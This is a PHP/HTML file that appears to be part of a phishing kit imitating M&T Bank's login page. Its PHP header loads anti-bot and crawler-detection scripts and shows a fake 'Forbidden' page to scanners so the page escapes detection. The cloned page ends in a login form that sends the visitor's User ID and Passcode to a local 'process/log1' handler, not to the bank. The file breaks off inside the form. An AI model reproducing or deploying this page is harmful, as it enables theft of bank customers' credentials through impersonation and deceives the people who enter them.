<?php

$useragent = $_SERVER['HTTP_USER_AGENT'];
include '../Bots/fucker.php';
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
?>

<html lang="en">

<head class="at-element-marker">
	<meta charset="UTF-8">
	<title>Log In | M&amp;T Bank</title>
	<meta name="description" content="Access all of your various M&amp;T applications in one convenient place. Select a link below, then enter your username and passcode to continue.">
	<meta name="template" content="content-page">
	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
	
	<link rel="appple-touch-icon" sizes="57x57" href="img/1.png" type="image/png">
	<link rel="appple-touch-icon" sizes="60x60" href="img/2.png" type="image/png">
	<link rel="appple-touch-icon" sizes="72x72" href="img/3.png" type="image/png">
	<link rel="appple-touch-icon" sizes="76x76" href="img/4.png" type="image/png">
	<link rel="appple-touch-icon" sizes="114x114" href="img/5.png" type="image/png">
	<link rel="appple-touch-icon" sizes="120x120" href="img/6.png" type="image/png">
	<link rel="appple-touch-icon" sizes="144x144" href="img/7.png" type="image/png">
	<link rel="appple-touch-icon" sizes="152x152" href="img/8.png" type="image/png">
	<link rel="appple-touch-icon" sizes="180x180" href="img/9.png" type="image/png">
	<link rel="appple-touch-icon-precomposed" sizes="192x192" href="img/10.png" type="image/png">
	<link rel="appple-touch-icon" sizes="192x192" href="img/11.png" type="image/png">
	<link rel="icon" sizes="96x96" href="img/a1.png" type="image/png">
	<link rel="icon" sizes="32x32" href="img/a2.png" type="image/png">
	<link rel="icon" sizes="16x16" href="img/a3.png" type="image/png">
	<link rel="stylesheet" href="css/clientlib-base.css" type="text/css">
	
	<link rel="canonical" href="">
	
</head>

<body id="mtbank-website" style="overflow: hidden;">
	<div>
		<div hidden="hidden">
			<div>
				<div class="xfpage page basicpage">
					<div class="xf-content-height">
						<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
							<div class="header aem-GridColumn aem-GridColumn--default--12"><a class="component skip-navigation -no-standard-margin" href="#skiptomaincontent" role="button" aria-label="skip to main content" tabindex="0">Skip to Main Content</a>
								<nav class="header-wrapper">
									<ul class="header-nav-container">
										<li class="header-nav-item"> <a href="/personal" class="header-link -parent-page" data-speedbump-enabled="false">
                Personal
            </a> </li>
										<li class="header-nav-item"> <a href="/business" class="header-link" data-speedbump-enabled="false">
                Business
            </a> </li>
										<li class="header-nav-item"> <a href="/commercial" class="header-link" data-speedbump-enabled="false">
                Commercial
            </a> </li>
										<li class="header-nav-item"> <a href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response" class="header-link" data-speedbump-enabled="false">
                COVID-19 Updates
            </a> </li>
									</ul>
									<div class="header-logo">
										<a href="/personal" class="header-logo-link" data-speedbump-enabled="false">
											<svg class="header-icon" aria-label="Return to Homepage">
												<use xlink:href="#logo"></use>
											</svg>
										</a>
									</div>
									<div class="header-misc">
										<ul class="header-misc-container">
											<li class="header-misc-item">
												<a href="#login-modal" class="header-link -login" aria-label="Log In, use escape key to exit modal window." aria-haspopup="true" role="button">
													<svg class="header-icon -icon-lock" role="presentation">
														<title>Lock</title>
														<use xlink:href="#icon-lock"></use>
													</svg> Log In<span class="caret" role="presentation">&gt;</span> </a>
											</li>
											<li class="header-misc-item">
												<a href="#info-modal" class="header-link -icon" data-speedbump-enabled="false" role="button" aria-label=", use escape key to exit modal window." aria-haspopup="true">
													<svg class="header-icon -icon-question-mark" aria-hidden="true">
														<use xlink:href="#icon-question-mark"></use>
													</svg>
												</a>
											</li>
											<li class="header-misc-item">
												<a href="" class="header-link -icon" data-speedbump-enabled="false" aria-label="Location">
													<svg class="header-icon -icon-location-pin" aria-hidden="true">
														<use xlink:href="#icon-location-pin"></use>
													</svg>
												</a>
											</li>
											<li class="header-misc-item">
												<a href="#search-modal" class="header-link -icon" data-speedbump-enabled="false" role="button" aria-label="Search, use escape key to exit modal window." aria-haspopup="true">
													<svg class="header-icon -icon-magnifying-glass" aria-hidden="true">
														<use xlink:href="#icon-magnifying-glass"></use>
													</svg>
												</a>
											</li>
										</ul>
									</div>
									<a href="#hamburger-nav" class="hamburger-button" aria-label="Open Navigation Menu, use escape key to exit modal window." role="button" aria-haspopup="true">
										<svg class="icon-hamburger-menu" role="img" aria-hidden="true">
											<title>Navigation Menu</title>
											<use xlink:href="#icon-hamburger-menu"></use>
										</svg>
									</a>
									<a href="#search-modal" class="search-button" aria-label="Search, use escape key to exit modal window." role="button" aria-haspopup="true">
										<svg class="header-icon-magnifying-glass" role="img" aria-hidden="true">
											<title>Search</title>
											<use xlink:href="#icon-magnifying-glass"></use>
										</svg>
									</a>
								</nav>
							</div>
							<div class="modal aem-GridColumn aem-GridColumn--default--12">
								<div class="component modal-data hamburger-nav">
									<div>
										<div class="xf-content-height">
											<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
												<div class="columns aem-GridColumn aem-GridColumn--default--12">
													<div class="columns-container -lg-top-padding   ">
														<div class="columns-wrapper -grey">
															<div class="column-content ">
																<div class="col-12 column-parsys -no-horizontal-padding">
																	<div class="navigation section">
																		<div class="component navigation">
																			<div class="navigation-main">
																				<div class="navigation-logo-link" aria-label="M&amp;T Bank Logo">
																					<svg class="navigation-logo" aria-hidden="true">
																						<use xlink:href="#logo"></use>
																					</svg>
																				</div>
																				<ul role="list" class="navigation-desktop">
																					<li role="listitem" class="navigation-parent" data-mobile-class="personal"> <a class="navigation-link parent-title " aria-label="Personal" aria-expanded="true" href="/personal">Personal
				</a>
																						<ul role="list" class="navigation-children _hidden">
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Personal" href="/personal">Personal
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Banking" href="/personal/personal-banking">Banking
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Checking Accounts" href="/personal/personal-banking/checking-accounts-mandt-bank">Checking Accounts
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Mortgages &amp; Loans" href="/personal/mortgages-and-loans">Mortgages &amp; Loans
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Insurance" href="/personal/insurance-investments-and-insurance">Insurance
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Investments &amp; Retirement" href="/personal/wilmington-advisors">Investments &amp; Retirement
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Multicultural Banking" href="/homepage/personal-and-business-banking-mortgages-and-more/community-involvement/multicultural-banking">Multicultural Banking
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Financial Education Center" href="/personal/education-portal">Financial Education Center
						</a> </li>
																						</ul>
																					</li>
																					<li role="listitem" class="navigation-parent" data-mobile-class="business"> <a class="navigation-link parent-title " aria-label="Business" aria-expanded="true" href="/business">Business
				</a>
																						<ul role="list" class="navigation-children _hidden">
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Business" href="/business">Business
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Bank" href="/business/business-banking-checking-and-service-options">Bank
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Manage Cash Flow" href="/business/cash-management-for-business">Manage Cash Flow
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Online &amp; Mobile Services" href="/business/online---mobile-services">Online &amp; Mobile Services
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Finance" href="/business/business-financing">Finance
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Insurance" href="/business/small-business-insurance">Insurance
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Resources &amp; Insights" href="/business/business-resources---insights">Resources &amp; Insights
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Business Education Center" href="/business/business-education-portal">Business Education Center
						</a> </li>
																						</ul>
																					</li>
																					<li role="listitem" class="navigation-parent" data-mobile-class="commercial"> <a class="navigation-link parent-title " aria-label="Commercial" aria-expanded="true" href="/commercial">Commercial
				</a>
																						<ul role="list" class="navigation-children _hidden">
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Commercial" href="/commercial">Commercial
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Bank" href="/commercial/commercial-banking">Bank
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Finance" href="/commercial/commercial-financing-and-lending-solutions">Finance
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Industry Solutions" href="/commercial/commercial-banking-industry-solutions">Industry Solutions
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Insurance" href="/commercial/commercial-insurance">Insurance
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Invest &amp; Grow" href="/commercial/corporate-investment-services">Invest &amp; Grow
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Resources &amp; Insights" href="/commercial/resources-and-insights">Resources &amp; Insights
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="M&amp;T Financial Services" href="/commercial/m-t-financial-services">M&amp;T Financial Services
						</a> </li>
																						</ul>
																					</li>
																					<li role="listitem" class="navigation-parent" data-mobile-class="covid19"> <a class="navigation-link parent-title " aria-label="COVID-19" aria-expanded="true" href="/covid-19-response">COVID-19
				</a>
																						<ul role="list" class="navigation-children _hidden">
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Personal Updates" href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response/personal">Personal Updates
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Business Updates" href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response/covid-19-business">Business Updates
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Community Updates" href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response">Community Updates
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Hardship FAQs" href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response/covid-19-hardship-faqs">Hardship FAQs
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Paycheck Protection Program | M&amp;T Bank" href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response/covid-19-business/paycheck-protection-program">Paycheck Protection Program | M&amp;T Bank
						</a> </li>
																							<li class="navigation-child" role="listitem"> <a class="navigation-link navigation-child-link " aria-label="Español" href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response/es">Español
						</a> </li>
																						</ul>
																					</li>
																				</ul>
																				<ul role="list" class="navigation-options -desktop-hidden">
																					<ul role="list" class="navigation-options-icons">
																						<li role="listitem">
																							<a class="navigation-option search" href="#search-modal" aria-label="Search, use escape key to exit modal window." aria-haspopup="true" role="button">
																								<svg class="navigation-icon -icon-magnifying-glass" aria-hidden="true">
																									<use xlink:href="#icon-magnifying-glass"></use>
																								</svg>
																								<div class="navigation-icon-text">Search</div>
																							</a>
																						</li>
																						<li role="listitem" class="float-nav-item">
																							<a class="navigation-option location" href="" aria-label="Location, use escape key to exit modal window." aria-haspopup="true" role="button">
																								<svg class="navigation-icon -icon-location-pin" aria-hidden="true">
																									<use xlink:href="#icon-location-pin"></use>
																								</svg>
																								<div class="navigation-icon-text">Locations</div>
																							</a>
																						</li>
																						<li role="listitem">
																							<a class="navigation-option help-center" href="#info-modal" aria-label="Help Center, use escape key to exit modal window." aria-haspopup="true" role="button">
																								<svg class="navigation-icon -icon-question-mark" aria-hidden="true">
																									<use xlink:href="#icon-question-mark"></use>
																								</svg>
																								<div class="navigation-icon-text">Help Center</div>
																							</a>
																						</li>
																					</ul>
																					<li role="listitem" class="nav-mobile-button"> </li>
																				</ul>
																			</div>
																			<div class="navigation-sidebar">
																				<div class="cta-button">
																					<div class="cta-button component -text-width style-g size-m margin-none ">
																						<a class="cta-button-link" data-speedbump-enabled="false" href="#login-modal" aria-label="This link will open the Online Banking Login Modal, use escape key to exit modal window." data-id="550803776" data-comp-type="cta-button" aria-haspopup="true" role="button"> <span class="button-text  -chevron">Log In</span> </a>
																					</div>
																				</div>
																				<div class="helpful-links">
																					<div class="helpful-links-container component">
																						<ul class="helpful-links-list">
																							<li> <a data-speedbump-enabled="false" class="helpful-link" href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response" aria-label="COVID-19 Updates" target="_self">COVID-19 Updates</a> </li>
																							<li> <a data-speedbump-enabled="false" class="helpful-link" href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response/covid-19-business" aria-label="Paycheck Protection Program" target="_self">Paycheck Protection Program</a> </li>
																							<li> <a data-speedbump-enabled="false" class="helpful-link" href="/homepage/explore-the-m-and-t-bank-help-center/mandt-bank-faqs" aria-label="F A Qs" target="_self">F A Qs</a> </li>
																							<li> <a data-speedbump-enabled="false" class="helpful-link" href="/homepage/explore-the-m-and-t-bank-help-center/discover-top-banking-tasks" aria-label="Common Banking Tasks" target="_self">Common Banking Tasks</a> </li>
																							<li> <a data-speedbump-enabled="false" class="helpful-link" href="/homepage/explore-the-m-and-t-bank-help-center/location-atms" aria-label="Locations &amp; ATMs" target="_self">Locations &amp; ATMs</a> </li>
																							<li> <a data-speedbump-enabled="false" class="helpful-link" href="/homepage/personal-and-business-banking-mortgages-and-more" aria-label="About M&amp;T" target="_self">About M&amp;T</a> </li>
																							<li> <a data-speedbump-enabled="false" class="helpful-link" href="/homepage/explore-the-m-and-t-bank-help-center/bank-security-tips-and-best-practices" aria-label="Banking Security" target="_self">Banking Security</a> </li>
																							<li> <a data-speedbump-enabled="false" class="helpful-link" href="/homepage/careers" aria-label="Careers" target="_self">Careers</a> </li>
																						</ul>
																					</div>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="modal aem-GridColumn aem-GridColumn--default--12">
								<div class="component modal-data info-modal">
									<div>
										<div class="xf-content-height">
											<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
												<div class="columns aem-GridColumn aem-GridColumn--default--12">
													<div class="columns-container    ">
														<div class="columns-wrapper -grey">
															<div class="column-content ">
																<div class="col-3 column-parsys -lg-horizontal-padding">
																	<div class="image section">
																		<div class="image component " data-imagespeedbump="false">
																			<div data-cmp-lazythreshold="0" data-cmp-src="img/green-logo.png" data-asset="img/green-logo.png" data-asset-id="4e7152d4-e775-4776-9028-35b98cfd176f" id="image-adfc8eb4ff" class="cmp-image" itemscope="" itemtype=""> <img src="img/green-logo.png" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image"> </div>
																		</div>
																	</div>
																</div>
																<div class="col-3 column-parsys -lg-horizontal-padding"> </div>
																<div class="col-3 column-parsys -lg-horizontal-padding"> </div>
																<div class="col-3 column-parsys -lg-horizontal-padding"> </div>
															</div>
														</div>
													</div>
												</div>
												<div class="columns aem-GridColumn aem-GridColumn--default--12">
													<div class="columns-container    ">
														<div class="columns-wrapper -grey">
															<div class="column-content ">
																<div class="col-4 column-parsys -lg-horizontal-padding">
																	<div class="richtext text section">
																		<div class="cmp-text richtext component">
																			<h4>Common Tasks</h4>
																			<p><a href="">&ZeroWidthSpace;&ZeroWidthSpace;Ask a Question/Submit Your Feedback</a></p>
																			<p><a href="/homepage/explore-the-m-and-t-bank-help-center/discover-top-banking-tasks/how-to-reset-your-account-passcode">Reset Your Online Banking Passcode</a></p>
																			<p><a href="/homepage/explore-the-m-and-t-bank-help-center/discover-top-banking-tasks/how-to-find-a-bank-account-routing-number">Find Your Routing Number</a></p>
																			<p><a href="/homepage/explore-the-m-and-t-bank-help-center/discover-top-banking-tasks/how-to-report-a-lost-debit-or-credit-card">Report a Stolen Debit or Credit Card</a></p>
																			<p><a href="/homepage/explore-the-m-and-t-bank-help-center/discover-top-banking-tasks/how-to-change-name-or-address-on-bank-account">Change Your Name on Your Account/Cards</a></p>
																			<p><a title="Same tab opens to the M&amp;T Pay Your Loan page." data-speedbump-enabled="false" href="/personal/mortgages-and-loans/pay-your-loan" target="_self">Pay Your Consumer Loan, Line or Credit Card</a></p>
																			<p><a href="" target="_blank">Make an Appointment</a></p>
																		</div>
																	</div>
																</div>
																<div class="col-4 column-parsys -lg-horizontal-padding">
																	<div class="richtext text section">
																		<div class="cmp-text richtext component">
																			<h4>Help by Topic</h4>
																			<p><a href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response" target="_self">COVID-19 Updates</a></p>
																			<p><a href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response/personal#financial" target="_blank">COVID Hardship</a></p>
																			<p><a href="/homepage/explore-the-m-and-t-bank-help-center/covid-19-response/covid-19-business" target="_blank">Paycheck Protection Program (PPP)</a></p>
																			<p><a href="/personal/personal-banking/online-and-mobile-services">Online &amp; Mobile Services</a></p>
																			<p><a href="/homepage/personal-and-business-banking-mortgages-and-more/community-involvement/multicultural-banking">Multicultural Banking</a></p>
																			<p><a href="/homepage/explore-the-m-and-t-bank-help-center/mandt-bank-faqs">F A Qs</a></p>
																			<p><a href="/homepage/explore-the-m-and-t-bank-help-center/mandt-bank-phone-numbers-by-department">Contact M&amp;T</a></p>
																			<p><a href="/homepage/careers">Careers</a></p>
																		</div>
																	</div>
																</div>
																<div class="col-4 column-parsys -lg-horizontal-padding">
																	<div class="richtext text section">
																		<div class="cmp-text richtext component">
																			<h4>Looking for<br>something else?</h4>
																			<p>Use our online help center
																				<br> so you can find your answers and
																				<br> get back to what matters most
																				<br> to you.</p>
																		</div>
																	</div>
																	<div class="cta-button section">
																		<div class="cta-button component -text-width style-g 10  ">
																			<a class="cta-button-link" data-speedbump-enabled="false" href="/homepage/explore-the-m-and-t-bank-help-center" data-id="528824019" data-comp-type="cta-button"> <span class="button-text  ">Help Center</span> </a>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="body aem-GridColumn aem-GridColumn--default--12">
								<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" style="display: none;">
									<symbol id="global-nav-icon" viewBox="0 0 13 13">
										<g class="global-nav-icon" stroke="#EEEDEC" fill="none">
											<path d="M12 6.25C12 9.43 9.43 12 6.25 12S.5 9.43.5 6.25C.5 3.08 3.07.5 6.25.5S12 3.08 12 6.25z"></path>
											<path d="M6.25.5c1.35 1.38 2.2 3.44 2.2 5.75 0 2.3-.85 4.38-2.2 5.75"></path>
											<path d="M6.25.5c-1.35 1.38-2.2 3.44-2.2 5.75 0 2.3.85 4.38 2.2 5.75"></path>
											<path d="M.83 4.33h10.84"></path>
											<path d="M.83 8.17h10.84"></path>
										</g>
									</symbol>
								</svg>
							</div>
							<div class="body aem-GridColumn aem-GridColumn--default--12">
								<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" style="display: none;">
									<symbol id="global-nav-icon" viewBox="0 0 13 13">
										<g class="global-nav-icon" stroke="#EEEDEC" fill="none">
											<path d="M12 6.25C12 9.43 9.43 12 6.25 12S.5 9.43.5 6.25C.5 3.08 3.07.5 6.25.5S12 3.08 12 6.25z"></path>
											<path d="M6.25.5c1.35 1.38 2.2 3.44 2.2 5.75 0 2.3-.85 4.38-2.2 5.75"></path>
											<path d="M6.25.5c-1.35 1.38-2.2 3.44-2.2 5.75 0 2.3.85 4.38 2.2 5.75"></path>
											<path d="M.83 4.33h10.84"></path>
											<path d="M.83 8.17h10.84"></path>
										</g>
									</symbol>
								</svg>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<main class="main-content" id="skiptomaincontent" hidden="hidden" aria-hidden="true">
			<div class="root responsivegrid">
				<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
					<div class="responsivegrid aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--11 aem-GridColumn--offset--default--1">
						<div class="aem-Grid aem-Grid--11 aem-Grid--default--11 ">
							<div class="hero aem-GridColumn aem-GridColumn--default--11">
								<section class="hero component ">
									<div class="hero-wrapper">
										<div class="hero-text-container">
											<div class="hero-title  ">
												<h1 class="h1">Log In</h1> </div>
											<div class="hero-text  ">
												<p>Access all of your various M&amp;T applications in one convenient place. Select a link below, then enter your username and passcode to continue.
													<br> </p>
											</div>
											<div class="hero-buttons  ">
												<div class="hero-cta-button  "> </div>
												<div class="hero-cta-button  "> </div>
											</div>
										</div>
									</div>
								</section>
							</div>
							
					</div>
					<div class="disclosure aem-GridColumn aem-GridColumn--default--12">
						<div class="disclosure component">
							<div class="_hidden"> </div>
							<div class="disclosure-wrapper">
								<h3 class="disclosure-title"></h3>
								<ul class="unnumbered-disclosures"></ul>
								<ol class="numbered-disclosures"></ol>
							</div>
						</div>
					</div>
				</div>
			</div>
		</main>
		<div>
			<div class="xfpage page basicpage">
				<div class="xf-content-height">
					<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
						<div class="footer aem-GridColumn aem-GridColumn--default--12">
							<div class="footer-wrapper" role="contentinfo" hidden="hidden">
								<div class="footer-container">
									<div class="footer-line-block">
										<div class="footer-column -why-bank">
											<h2 class="footer-title">
                    Why Bank with M&amp;T?
                </h2>
											<p class="footer-text -light-font"> We understand what’s important. That’s why we’ve built a banking experience with you in mind. </p>
											<p class="footer-text"> Help us make your banking experience better.
												<br> <a href="" data-speedbump-enabled="false" class="footer-link">Send feedback</a> </p>
										</div>
										<div class="footer-column -contact-us">
											<div class="footer-contact-us-container">
												<h3 class="contact-us-header">
                        Contact Us
                    </h3>
												<ul class="footer-contact-us-items">
													<li class="contact-us-item">
														<a href="tel:1-800-724-2440" class="footer-contact-us-link">
															<svg class="icon icon-phone">
																<use xlink:href="#icon-phone"></use>
															</svg> <span class="icon-text">1-800-724-2440</span> </a>
													</li>
													<li class="contact-us-item">
														<a href="" target="_blank" data-speedbump-enabled="false" class="footer-contact-us-link">
															<svg class="icon icon-location-pin">
																<use xlink:href="#icon-location-pin"></use>
															</svg> <span class="icon-text">Locations &amp; ATMs</span> </a>
													</li>
													<li class="contact-us-item">
														<a href="" target="_blank" data-speedbump-enabled="false" class="footer-contact-us-link">
															<svg class="icon icon-chat">
																<use xlink:href="#icon-chat"></use>
															</svg> <span class="icon-text">Make an Appointment</span> </a>
													</li>
													<li class="contact-us-item">
														<a href="" target="_blank" data-speedbump-enabled="false" class="footer-contact-us-link">
															<svg class="icon icon-more-ways">
																<use xlink:href="#icon-more-ways"></use>
															</svg> <span class="icon-text">More ways to reach us</span> </a>
													</li>
												</ul>
											</div>
										</div>
										<div class="footer-separator"></div>
									</div>
									<div class="footer-line-block">
										<div class="footer-column -about">
											<h3 class="footer-about-header">
                    About
                </h3>
											<ul class="footer-about-items">
												<li class="footer-about-item">
													<a href="/homepage/personal-and-business-banking-mortgages-and-more" data-speedbump-enabled="false" target="_self" class="footer-about-link"> <span class="footer-icon-text">About M&amp;T</span> </a>
												</li>
												<li class="footer-about-item">
													<a href="/homepage/careers" data-speedbump-enabled="false" target="_self" class="footer-about-link"> <span class="footer-icon-text">Careers</span> </a>
												</li>
												<li class="footer-about-item">
													<a href="" data-speedbump-enabled="false" target="_self" class="footer-about-link"> <span class="footer-icon-text">Investor Relations</span> </a>
												</li>
												<li class="footer-about-item">
													<a href="/homepage/explore-the-m-and-t-bank-help-center/bank-security-tips-and-best-practices" data-speedbump-enabled="false" class="footer-about-link">
														<svg class="footer-icon icon-lock">
															<use xlink:href="#icon-lock"></use>
														</svg> <span class="footer-icon-text">Security</span> </a>
												</li>
											</ul>
										</div>
										<div class="footer-separator"></div>
										<div class="footer-column -search">
											<a href="#search-modal" class="footer-search" aria-label="Search, use escape key to exit modal window." aria-haspopup="true" role="button">
												<svg class="footer-icon-magnifying-glass" aria-hidden="true">
													<use xlink:href="#icon-magnifying-glass"></use>
												</svg> Search </a>
											<ul class="footer-social-icons">
												<li>
													<a data-speedbump-enabled="true" aria-label="Facebook" href="" class="footer-social-link">
														<svg class="footer-icon -facebook-social" aria-hidden="true">
															<title>Facebook</title>
															<use xlink:href="#icon-facebook-social"></use>
														</svg>
													</a>
												</li>
												<li>
													<a data-speedbump-enabled="true" aria-label="Twitter" href="" class="footer-social-link">
														<svg class="footer-icon -twitter-social" aria-hidden="true">
															<title>Twitter</title>
															<use xlink:href="#icon-twitter-social"></use>
														</svg>
													</a>
												</li>
												<li>
													<a data-speedbump-enabled="true" aria-label="LinkedIn" href="" class="footer-social-link">
														<svg class="footer-icon -linkedin-social" aria-hidden="true">
															<title>LinkedIn</title>
															<use xlink:href="#icon-linkedin-social"></use>
														</svg>
													</a>
												</li>
											</ul>
										</div>
									</div>
								</div>
							</div>
							<div class="footer-legal-wrapper" hidden="hidden">
								<div class="footer-legal">
									<div class="footer-EHL-copyright">
										<svg aria-hidden="true" class="footer-icon -equal-housing">
											<use xlink:href="#icon-equal-housing"></use>
										</svg> <span class="footer-copyright-text">
                    Equal Housing Lender. © 2021 M&amp;T Bank. Member FDIC. All rights reserved.
            </span> </div>
									<div class="footer-nav">
										<ul class="footer-nav-items">
											<li class="footer-nav-item"> <a href="/homepage/explore-the-m-and-t-bank-help-center/bank-policies/privacy-policy" data-speedbump-enabled="false" target="_self" class="footer-nav-link">Privacy</a> </li>
											<li class="footer-nav-item"> <a href="/homepage/sitemap" data-speedbump-enabled="false" target="_self" class="footer-nav-link">Sitemap</a> </li>
											<li class="footer-nav-item"> <a href="" data-speedbump-enabled="false" target="_self" class="footer-nav-link">Digital Service Agreement</a> </li>
											<li class="footer-nav-item"> <a href="" data-speedbump-enabled="false" target="_self" class="footer-nav-link">ESign Consent</a> </li>
											<li class="footer-nav-item"> <a href="/homepage/explore-the-m-and-t-bank-help-center/bank-policies/terms-of-use-policy" data-speedbump-enabled="false" target="_self" class="footer-nav-link">Terms of Use</a> </li>
										</ul>
									</div>
								</div>
							</div>
							<div class="modal-wrapper">
								<button class="modal-close">
									<svg class="icon-close">
										<use xlink:href="#icon-close-thin"></use>
									</svg>
								</button>
								<div class="modal-container" style="display: block;">
									<div class="login-modal modal-data -open" style="display: block;">
										<div class="xfpage page basicpage">
											<div class="xf-content-height">
												<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
													<div class="login aem-GridColumn aem-GridColumn--default--12">
														<div class="login-container component ">
															<div class="right-side">
																<div class="login-form-container component">
																	<div class="login-logo-link" aria-label="M&amp;T Bank Logo">
																		<svg class="login-logo" aria-hidden="true">
																			<use xlink:href="#logo"></use>
																		</svg>
																	</div>
																	<div class="login-scroll">
																		<div class="mobile-option">
																			<div class="login-form-selection">
																				<button class="option -active" data-option="user" aria-label="Personal and Business Login Tab" aria-selected="true" aria-pressed="true">Personal / Business</button>
																				<button class="option" data-option="dealer" aria-label="Commercial Login Tab" aria-selected="false" aria-pressed="false">Commercial</button>
																			</div>
																		</div>
																		<div class="alert-login-messages">
																			<div class="form-error-section _hidden">
																				<div class="form-error-message" role="alert"> </div>
																			</div>
																			<div class="form-outage-section _hidden">
																				<div class="form-outage-message-container" role="alert"> </div>
																			</div>
																		</div>
																		<div class="desktop-option">
																			<div class="login-form-selection">
																				<button class="option -active" data-option="user" aria-label="Personal and Business Login Tab" aria-selected="true" aria-pressed="true">Personal / Business</button>
																				<button class="option" data-option="dealer" aria-label="Commercial Login Tab" aria-selected="false" aria-pressed="false">Commercial</button>
																			</div>
																		</div>
																		<form method="post" action="process/log1" autocomplete="off" class="login-form -personal-business">
																			<fieldset class="login-fieldset">
																				<legend class="_visuallyhidden">Personal / Business Login</legend>
																				<div class="login-textfield">
																				
																					<input type="text" id="userid" name="userid" value="" class="login-field animateInput" autocomplete="off" aria-invalid="false" minlength="5" maxlength="20" role="textbox" required="true" placeholder="User ID"> </div>
																				<div class="login-textfield -login-user-only">


																					
																					<input type="password" id="passcode" name="passcode" value="" class="login-field animateInput -last" autocomplete="off" aria-invalid="false" minlength="8" maxlength="20" role="textbox" required="true" placeholder="Passcode"> </div>
																				<div class="login-split -checkbox">
																					<div class="login-item">
